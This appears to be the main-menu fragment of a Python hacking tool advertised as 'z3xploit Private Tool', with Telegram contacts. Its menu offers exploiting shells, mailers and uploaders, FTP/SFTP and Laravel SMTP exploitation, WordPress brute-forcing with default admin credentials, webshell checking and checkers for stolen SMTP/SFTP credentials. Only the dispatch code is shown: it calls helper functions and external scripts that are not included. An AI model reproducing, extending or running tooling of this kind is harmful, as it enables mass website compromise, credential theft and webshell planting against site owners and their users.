[#] Create By :
                             [#] Create By ::

							███████╗██████╗ ██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
							╚══███╔╝╚════██╗╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
							  ███╔╝  █████╔╝ ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
							 ███╔╝   ╚═══██╗ ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
							███████╗██████╔╝██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
							╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                                             
                                        
                             
                           z3xploit Private Tool
                          https://t.me/z3xploit - @z3xploit
						  Contact: @z3xrin
                                                 

\033[91m[Exploiter Menu]
[1] Expl0it Shells,Mailers,Uploaders(x)
[2] Expl0it Sftp / Ftp
[3] Expl0it Laravel SMTPs
[4] ReverseIP V2.0 [ 3 API ]
[5] Clean list
[6] Zone-h Grabber
[7] WordPress CMS Checker
[8] WordPress Bruteforce / DEFAULT BRUTEFROCER ADMIN:ADMIN ADMIN:PASS
[9] HostName Webshell Checker

[Checker Menu]
[01] Check Sftps
[02] Check SMTPs
[0] Exit\033[91m
""")
    choice = input("Select number :P : ")

    if choice == "1":
        print("""
   Enjoy :P
   Contact: @exploitcs
""")
        pr()
    elif choice == "2":
        ftp_hunter_menu()
    elif choice == "3":
       smtp_exploit()
       filter_and_create_allsmtp()
    elif choice == "4":
       reverse_ip_menu()   
    elif choice == "5":
        clean_web()
    elif choice == "6":
        zonehh()
    elif choice == "7":
        print("Running WordPress CMS Checker...")
        os.system("py -3 cmswp.py") 
    elif choice == "8":
        print("Running WordPress Bruteforcer...")
        os.system("py -3 bruteforcewp.py") 
    elif choice == "9":
        print("Running hostname webshell checker...")
        os.system("py -3 unamech.py")     
    elif choice == "01":
        ftp_sub_menu()
    elif choice == "02":
        smtp_checker()
        pass
    elif choice == "0":
        sys.exit(0)
    elif choice.strip() == "":
        main_menu()
    else:
        print("Invalid choice. Please select a valid option.")
main_menu()